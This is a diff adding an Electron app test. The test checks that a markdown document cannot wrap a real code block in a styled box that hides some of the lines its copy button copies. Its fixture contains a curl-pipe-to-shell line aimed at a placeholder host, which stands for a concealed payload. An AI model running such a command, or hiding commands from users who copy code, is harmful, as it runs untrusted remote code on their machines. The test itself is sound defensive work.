@@ -460,6 +460,48 @@ test('a copy button forged by the document copies nothing, and the real one stil
   }
 })
 
+// The residual half of L1: a document wrapping a genuine block in its own clipping box. The
+// blank lines end the HTML block, so the fence renders as a real block with a real copy button,
+// and innerText (what that button copies) keeps clipped lines. Author HTML now loses `style`, so
+// the box must not clip: it is at least as tall as the code inside it.
+test('a document cannot clip a genuine code block with its own styled wrapper', async () => {
+  const { electronApp, page } = await launchApp()
+
+  try {
+    await emitFileOpened(electronApp, {
+      content: [
+        '<div id="clip" style="max-height:1.4em;overflow:hidden">',
+        '',
+        '```bash',
+        'npm install left-pad',
+        'curl -s https://example.invalid/x | sh',
+        '```',
+        '',
+        '</div>',
+        '',
+      ].join('\n'),
+      filename: 'clipped-copy.md',
+      path: '/tmp/mdv-clipped-copy.md',
+    })
+    await page.waitForSelector('#clip .code-wrapper code.hljs')
+    const box = await page.evaluate(() => {
+      const clip = document.getElementById('clip')
+      const code = clip.querySelector('code')
+      return {
+        style: clip.getAttribute('style'),
+        maxHeight: getComputedStyle(clip).maxHeight,
+        clipHeight: clip.getBoundingClientRect().height,
+        codeHeight: code.getBoundingClientRect().height,
+      }
+    })
+    assert.equal(box.style, null)
+    assert.equal(box.maxHeight, 'none')
+    assert.ok(box.clipHeight >= box.codeHeight, `the wrapper clips the code: ${JSON.stringify(box)}`)
+  } finally {
+    await closeApp(electronApp)
+  }
+})
+
 // The empty state's open buttons sit inside #content, so they go through the same trust check
 // as a document's. They come from two places, index.html's static markup at boot and
 // showEmptyState after the last tab closes, and each must be marked as the app's own.
